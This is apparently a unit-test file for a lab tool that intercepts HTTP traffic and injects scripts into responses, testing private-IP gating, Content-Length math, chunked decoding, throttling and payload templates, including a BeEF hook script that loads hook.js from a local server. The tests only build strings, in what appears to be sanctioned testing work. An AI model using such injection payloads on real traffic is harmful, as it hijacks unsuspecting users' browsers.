"""
Unit tests for injection logic.

Tests Content-Length math, chunked handling, allowlist gating, and
injection strategies without requiring a live network.
"""

import pytest
import ipaddress
from pathlib import Path


class TestSafetyValidation:
    """Test safety validation logic."""
    
    def test_validate_rfc1918_valid_private_ips(self):
        """Test that valid RFC1918 private IPs are in private ranges."""
        private_ranges = [
            ipaddress.ip_network("10.0.0.0/8"),
            ipaddress.ip_network("172.16.0.0/12"),
            ipaddress.ip_network("192.168.0.0/16"),
        ]
        
        valid_ips = ["10.0.0.1", "10.255.255.254", "172.16.0.1", 
                     "172.31.255.254", "192.168.0.1", "192.168.255.254"]
        
        for ip_str in valid_ips:
            ip_obj = ipaddress.ip_address(ip_str)
            is_private = any(ip_obj in network for network in private_ranges)
            assert is_private is True, f"{ip_str} should be private"
    
    def test_validate_rfc1918_invalid_public_ips(self):
        """Test that public IPs are not in private ranges."""
        private_ranges = [
            ipaddress.ip_network("10.0.0.0/8"),
            ipaddress.ip_network("172.16.0.0/12"),
            ipaddress.ip_network("192.168.0.0/16"),
        ]
        
        public_ips = ["8.8.8.8", "1.1.1.1", "172.15.255.255", "192.169.0.1"]
        
        for ip_str in public_ips:
            ip_obj = ipaddress.ip_address(ip_str)
            is_private = any(ip_obj in network for network in private_ranges)
            assert is_private is False, f"{ip_str} should not be private"


class TestContentLengthMath:
    """Test Content-Length calculation after injection."""
    
    def test_content_length_calculation_basic(self):
        """Test basic Content-Length calculation."""
        original_html = "<html><body>Hello</body></html>"
        payload = "<script>console.log('test');</script>"
        
        original_length = len(original_html.encode('utf-8'))
        injected_html = original_html.replace("</body>", payload + "</body>")
        new_length = len(injected_html.encode('utf-8'))
        
        expected_increase = len(payload.encode('utf-8'))
        assert new_length == original_length + expected_increase
    
    def test_content_length_with_multibyte_chars(self):
        """Test Content-Length with multibyte UTF-8 characters."""
        original_html = "<html><body>Héllo 世界</body></html>"
        payload = "<script>console.log('test');</script>"
        
        original_length = len(original_html.encode('utf-8'))
        injected_html = original_html.replace("</body>", payload + "</body>")
        new_length = len(injected_html.encode('utf-8'))
        
        payload_length = len(payload.encode('utf-8'))
        assert new_length == original_length + payload_length
    
    def test_content_length_no_body_tag(self):
        """Test that Content-Length doesn't change when no body tag exists."""
        original_html = "<html><p>No body tag</p></html>"
        payload = "<script>console.log('test');</script>"
        
        original_length = len(original_html.encode('utf-8'))
        
        # No injection should occur
        injected_html = original_html.replace("</body>", payload + "</body>")
        new_length = len(injected_html.encode('utf-8'))
        
        # Should be the same since no replacement occurred
        assert new_length == original_length


class TestChunkedHandling:
    """Test chunked transfer encoding handling."""
    
    def test_dechunk_simple(self):
        """Test de-chunking a simple chunked response."""
        chunked_body = "5\r\nHello\r\n5\r\nWorld\r\n0\r\n\r\n"
        
        # Simple dechunking logic
        parts = chunked_body.split('\r\n')
        decoded = []
        i = 0
        
        while i < len(parts):
            chunk_size_line = parts[i].strip()
            if not chunk_size_line:
                i += 1
                continue
            
            try:
                chunk_size = int(chunk_size_line, 16)
                if chunk_size == 0:
                    break
                
                i += 1
                if i < len(parts):
                    chunk_data = parts[i][:chunk_size]
                    decoded.append(chunk_data)
                
                i += 1
            except ValueError:
                break
        
        dechunked = ''.join(decoded)
        assert dechunked == "HelloWorld"
    
    def test_dechunk_empty(self):
        """Test de-chunking an empty response."""
        chunked_body = "0\r\n\r\n"
        
        parts = chunked_body.split('\r\n')
        decoded = []
        i = 0
        
        while i < len(parts):
            chunk_size_line = parts[i].strip()
            if not chunk_size_line:
                i += 1
                continue
            
            try:
                chunk_size = int(chunk_size_line, 16)
                if chunk_size == 0:
                    break
                i += 1
                if i < len(parts):
                    chunk_data = parts[i][:chunk_size]
                    decoded.append(chunk_data)
                i += 1
            except ValueError:
                break
        
        dechunked = ''.join(decoded)
        assert dechunked == ""
    
    def test_dechunk_single_chunk(self):
        """Test de-chunking a single chunk."""
        chunked_body = "a\r\n0123456789\r\n0\r\n\r\n"
        
        parts = chunked_body.split('\r\n')
        decoded = []
        i = 0
        
        while i < len(parts):
            chunk_size_line = parts[i].strip()
            if not chunk_size_line:
                i += 1
                continue
            
            try:
                chunk_size = int(chunk_size_line, 16)
                if chunk_size == 0:
                    break
                i += 1
                if i < len(parts):
                    chunk_data = parts[i][:chunk_size]
                    decoded.append(chunk_data)
                i += 1
            except ValueError:
                break
        
        dechunked = ''.join(decoded)
        assert dechunked == "0123456789"


class TestInjectors:
    """Test injection strategy logic."""
    
    def test_eicar_payload_structure(self):
        """Test EICAR payload has correct structure."""
        # EICAR test string
        eicar_string = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        
        # Embed in script tag
        payload = f'<script>/* {eicar_string} */ console.log("EICAR test payload injected");</script>'
        
        assert "<script>" in payload
        assert "</script>" in payload
        assert "EICAR" in payload
    
    def test_beef_payload_structure(self):
        """Test BeEF hook payload has correct structure."""
        host = "127.0.0.1"
        port = 3000
        hook_url = f"http://{host}:{port}/hook.js"
        payload = f'<script src="{hook_url}"></script>'
        
        assert "<script src=" in payload
        assert "</script>" in payload
        assert "127.0.0.1" in payload
        assert "3000" in payload
    
    def test_alert_payload_structure(self):
        """Test alert payload has correct structure."""
        message = "Test Alert"
        escaped_message = message.replace("'", "\\'")
        payload = f'<script>alert("{escaped_message}");</script>'
        
        assert "<script>" in payload
        assert "alert(" in payload
        assert "Test Alert" in payload
        assert "</script>" in payload


class TestTargetingRules:
    """Test injection targeting rules."""
    
    def test_domain_whitelist(self):
        """Test domain whitelist filtering logic."""
        whitelist = ['example.com']
        host = 'example.com'
        
        # Should allow whitelisted domain
        assert any(domain in host for domain in whitelist) is True
        
        # Should block non-whitelisted domain
        host = 'other.com'
        assert any(domain in host for domain in whitelist) is False
    
    def test_domain_blacklist(self):
        """Test domain blacklist filtering logic."""
        blacklist = ['evil.com']
        host = 'evil.com'
        
        # Should block blacklisted domain
        assert any(domain in host for domain in blacklist) is True
        
        # Should allow non-blacklisted domain
        host = 'good.com'
        assert any(domain in host for domain in blacklist) is False


class TestThrottling:
    """Test injection throttling logic."""
    
    def test_throttling_enabled(self):
        """Test that throttling prevents rapid re-injection."""
        from datetime import datetime, timedelta
        
        session_injection_times = {}
        reinjection_delay = 5
        
        # First injection should not be throttled
        session_id = "test_session"
        assert session_id not in session_injection_times
        
        # Record injection
        session_injection_times[session_id] = datetime.now()
        
        # Immediate re-injection should be throttled
        elapsed = (datetime.now() - session_injection_times[session_id]).total_seconds()
        assert elapsed < reinjection_delay
    
    def test_throttling_expires(self):
        """Test that throttling expires after delay."""
        from datetime import datetime, timedelta
        
        session_injection_times = {}
        reinjection_delay = 1
        
        # Record injection in the past
        session_id = "test_session"
        session_injection_times[session_id] = datetime.now() - timedelta(seconds=2)
        
        # Should not be throttled after delay expires
        elapsed = (datetime.now() - session_injection_times[session_id]).total_seconds()
        assert elapsed >= reinjection_delay


class TestConfig:
    """Test configuration management logic."""
    
    def test_default_config_values(self):
        """Test that default configuration values are set correctly."""
        # Simulate default config
        config = {
            'injection': {
                'enabled': True,
                'only_text_html': True,
            },
            'network': {
                'queue_num': 0,
            },
            'logging': {
                'level': 'INFO',
            }
        }
        
        assert config['injection']['enabled'] is True
        assert config['injection']['only_text_html'] is True
        assert config['network']['queue_num'] == 0
        assert config['logging']['level'] == "INFO"


class TestInjectionStats:
    """Test injection statistics tracking."""
    
    def test_stats_initialization(self):
        """Test that stats initialize correctly."""
        # Simple stats tracking
        stats = {
            'packets_processed': 0,
            'http_responses_seen': 0,
            'injection_attempts': 0,
            'successful_injections': 0
        }
        
        assert stats['packets_processed'] == 0
        assert stats['http_responses_seen'] == 0
        assert stats['injection_attempts'] == 0
        assert stats['successful_injections'] == 0
    
    def test_stats_increment(self):
        """Test that stats increment correctly."""
        stats = {
            'packets_processed': 0,
            'http_responses_seen': 0,
            'injection_attempts': 0,
            'successful_injections': 0
        }
        
        stats['packets_processed'] += 100
        stats['http_responses_seen'] += 50
        stats['injection_attempts'] += 10
        stats['successful_injections'] += 5
        
        assert stats['packets_processed'] == 100
        assert stats['http_responses_seen'] == 50
        assert stats['injection_attempts'] == 10
        assert stats['successful_injections'] == 5
